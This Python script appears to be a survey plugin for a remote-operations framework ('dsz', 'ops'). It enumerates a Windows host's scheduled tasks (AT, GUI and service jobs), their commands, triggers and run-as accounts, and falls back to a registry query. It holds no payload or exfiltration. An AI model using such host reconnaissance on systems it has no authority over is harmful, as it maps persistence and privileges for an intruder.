
import dsz
import ops
import ops.env
import ops.system.scheduler
import ops.files.dirs
import ops.survey
from ops.pprint import pprint
from optparse import OptionParser
import os.path
import datetime

def main():
    parser = OptionParser()
    parser.add_option('--maxage', dest='maxage', default='3600', help='Maximum age of scheduler information to use before re-running query commands', type='int')
    (options, args) = parser.parse_args()
    ops.survey.print_header('Scheduler survey')
    schedulers = ops.system.scheduler.get_all_schedulers_local(maxage=datetime.timedelta(seconds=options.maxage))
    (windir, sysdir) = dsz.path.windows.GetSystemPaths()
    tasklist = ops.files.dirs.get_dirlisting(os.path.join(windir, 'Tasks'), cache_tag='TASKS_FOLDER_DIR', recursive=True)
    if (tasklist.commandmetadata.status != 0):
        ops.warn("Could not query Tasks folder. Look at the following value from the registry and decide if you want to try dir'ing it yourself.")
        regval = ops.cmd.quickrun('registryquery -hive L -key "Software\\Microsoft\\SchedulingAgent" -value TasksFolder')
        ops.info(('Tasks folder should be %s' % regval.key[0].value[0]))
        ops.pause()
    displays = list()
    dataage = datetime.timedelta(seconds=0)
    if ('at' in schedulers):
        dataage = schedulers['at'].dszobjage
        for job in schedulers['at'].atjob:
            freqstring = ''
            if (job.frequency == 'Today'):
                freqstring = ('Today at %s' % job.time)
            elif ((job.frequency == 'Each') or (job.frequency == 'Next')):
                freqstring = ('%s %s%s at %s' % (job.frequency, job.weekday, job.month, job.time))
            else:
                freqstring = 'Could not interpret data, check the job manually'
            displays.append({'source': 'AT', 'jobname': job.id, 'nextrun': freqstring, 'command': job.commandtext, 'triggers': '', 'runas': 'SYSTEM'})
    if ('gui' in schedulers):
        dataage = schedulers['gui'].dszobjage
        for job in schedulers['gui'].netjob:
            displays.append({'source': 'GUI', 'jobname': job.jobname, 'nextrun': ('%s %s' % (job.nextrundate, job.nextruntime)), 'command': ('%s %s' % (job.application, job.parameters)), 'triggers': job.trigger.triggerstring, 'runas': job.account})
    if ('service' in schedulers):
        dataage = schedulers['service'].dszobjage
        for folder in schedulers['service'].folder:
            for job in filter((lambda x: (not x.disabled)), folder.job):
                for action in job.action:
                    freqstring = ', '.join(map((lambda x: ('%s %s %s' % (x.type, x.startboundary, x.endboundary))), job.trigger))
                    if (action.type.lower() == 'exec'):
                        actionstring = ('%s %s (runs in "%s")' % (action.execjob.path, action.execjob.arguments, action.execjob.workingdir))
                    else:
                        actionstring = ('COM job ClassID and data: %s - %s' % (action.com.classid, action.com.data))
                    displays.append({'source': 'SERVICE', 'jobname': ('%s\\%s' % (folder.name, job.name)), 'nextrun': freqstring, 'command': actionstring, 'triggers': freqstring, 'runas': ('%s %s' % (job.principal.userid, job.principal.runlevel))})
    ops.survey.print_agestring(dataage)
    pprint(displays, dictorder=['source', 'command', 'nextrun', 'triggers', 'runas', 'jobname'], header=['source', 'command', 'nextrun', 'triggers', 'runas', 'jobname'])
if ((__name__ == '__main__') or (__name__ == ops.survey.PLUGIN)):
    main()